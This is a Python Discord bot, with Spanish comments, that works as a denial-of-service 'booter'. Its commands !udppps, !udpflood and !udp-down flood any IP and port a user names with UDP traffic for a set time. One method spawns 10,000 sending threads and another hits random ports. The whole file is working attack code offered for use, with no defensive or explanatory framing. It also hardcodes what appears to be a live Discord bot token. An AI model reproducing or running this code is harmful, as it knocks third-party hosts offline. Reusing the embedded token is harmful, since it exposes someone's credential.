import discord
from discord.ext import commands
import socket
import time
import asyncio
import threading
from random import randint

# Token de tu bot
TOKEN = 'MTQ2NjI0MjkwNzY0NzM3NzQ5MQ.GUFXzx.u7_2MCq6g1GlaH64T9oPb7lMm4_95pue5FTooQ'

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Control de ataques en curso y cooldown
attack_in_progress = False
last_attack_time = 0
cooldown_seconds = 10

@bot.event
async def on_ready():
    print(f'Bot has Connected! {bot.user.name}')

@bot.command(name='helps')
async def ayuda(ctx):
    help_text = (
        "⚡**Commands:**⚡\n"
        "- `!helps`\n"
        "- `!methods`"
    )
    await ctx.send(content=help_text)

@bot.command(name='methods')
async def methods(ctx):
    methods_text = (
        "💫**Methods:**💫\n"
        "- `!udppps <ip> <port> <time>`\n"
        "- `!udpflood <ip> <port> <time>`\n"
        "- `!udp-down <ip> <port> <time>`"
    )
    await ctx.send(methods_text)

# ------------------ UDPPPS ------------------
class Brutalize:
    def __init__(self, ip, port, packet_size=1024, threads=5):
        self.ip = ip
        self.port = port
        self.packet_size = packet_size
        self.threads = threads
        self.client = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.data = str.encode("x" * self.packet_size)
        self.len = len(self.data)
        self.on = False
        self.sent = 0
        self.total = 0

    def flood(self, duration):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            threading.Thread(target=self.send, daemon=True).start()
        threading.Thread(target=self.info, daemon=True).start()
        end_time = time.time() + duration
        try:
            while time.time() < end_time and self.on:
                time.sleep(0.1)
            self.stop()
        except KeyboardInterrupt:
            self.stop()

    def info(self):
        interval = 0.05
        mb = 1000000
        gb = 1000000000
        size = 0
        self.total = 0
        last_time = time.time()
        while self.on:
            time.sleep(interval)
            if not self.on:
                break
            now = time.time()
            if now - last_time >= 1:
                size = round(self.sent / mb)
                self.total += self.sent / gb
                self.sent = 0
                last_time = now

    def stop(self):
        self.on = False

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, (self.ip, self._randport()))
                self.sent += self.len
            except Exception:
                pass

    def _randport(self):
        return self.port or randint(1, 65535)

@bot.command(name='udppps')
async def udppps(ctx, ip: str, port: int, tiempo: int):
    global attack_in_progress, last_attack_time
    if attack_in_progress:
        await ctx.send("COOLDOWN! WAIT IT")
        return
    if time.time() - last_attack_time < cooldown_seconds:
        await ctx.send(f"❌Under Was {int(cooldown_seconds - (time.time() - last_attack_time))} Running❌")
        return
    attack_in_progress = True
    await ctx.send(f"✅🚀Attack a {ip}:{port} Time {tiempo} (UDPPPS)...")
    try:
        brute = Brutalize(ip, port, 1024, 5)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, brute.flood, tiempo)
        await ctx.send(f"✅UDPPPS Done✅")
    except Exception as e:
        await ctx.send(f"❌Error UDPPPS❌: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()

@udppps.error
async def udppps_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌Using: `!udppps <ip> <port> <time>`")
    else:
        await ctx.send(f"❌Error Somethings: {error}")

# ------------------ UDP-FLOOD ------------------
def send_packet_flood(ip, port, amplifier, stop_event):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((str(ip), int(port)))
        while not stop_event.is_set():
            s.send(b"\x99" * amplifier)
    except Exception:
        try:
            s.close()
        except:
            pass

def udp_flood_attack(ip, port, duration, amplifier, stop_event):
    loops = 10000
    threads = []
    for _ in range(loops):
        t = threading.Thread(target=send_packet_flood, args=(ip, port, amplifier, stop_event), daemon=True)
        t.start()
        threads.append(t)
    # Espera el tiempo de duración y luego detiene el evento
    time.sleep(duration)
    stop_event.set()

@bot.command(name='udpflood')
async def udpflood(ctx, ip: str, port: int, tiempo: int):
    global attack_in_progress, last_attack_time
    if attack_in_progress:
        await ctx.send("❌Attack was Under Running❌")
        return
    if time.time() - last_attack_time < cooldown_seconds:
        await ctx.send(f"Running {int(cooldown_seconds - (time.time() - last_attack_time))} Under Was")
        return
    attack_in_progress = True
    await ctx.send(f"Attack {ip}:{port} Time {tiempo}(UDP-FLOOD)...")
    stop_event = threading.Event()
    try:
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, udp_flood_attack, ip, port, tiempo, 750, stop_event)
        await ctx.send(f"✅UDP-FLOOD Done✅")
    except Exception as e:
        await ctx.send(f"❌Error UDP-FLOOD❌: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()

@udpflood.error
async def udpflood_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌Using: `!udpflood <ip> <port> <time>`")
    else:
        await ctx.send(f"❌Error❌: {error}")

# ------------------ UDP-DOWN ------------------
@bot.command(name='udp-down')
async def udp_down(ctx, ip: str, port: int, tiempo: int):
    global attack_in_progress, last_attack_time
    if attack_in_progress:
        await ctx.send("❌Under❌, Attack is Running")
        return
    if time.time() - last_attack_time < cooldown_seconds:
        await ctx.send(f"❌Cooldown! {int(cooldown_seconds - (time.time() - last_attack_time))}❌")
        return
    attack_in_progress = True
    await ctx.send(f"🚀✅Attack {ip}:{port} Time {tiempo} (UDP-DOWN)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
        end_time = time.time() + tiempo
        sent_packets = 0
        while time.time() < end_time:
            s.sendto(payload, (ip, port))
            sent_packets += 1
            await asyncio.sleep(0)
        await ctx.send(f"✅UDP-DOWN Done✅, Packets: {sent_packets}")
    except Exception as e:
        await ctx.send(f"❌Error UDP-DOWN❌: {e}")
    finally:
        attack_in_progress = False
        last_attack_time = time.time()

@udp_down.error
async def udp_down_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("Using: `!udp-down <ip> <port> <time>`")
    else:
        await ctx.send(f"UNEXPECT ERROR: {error}")

bot.run(TOKEN)
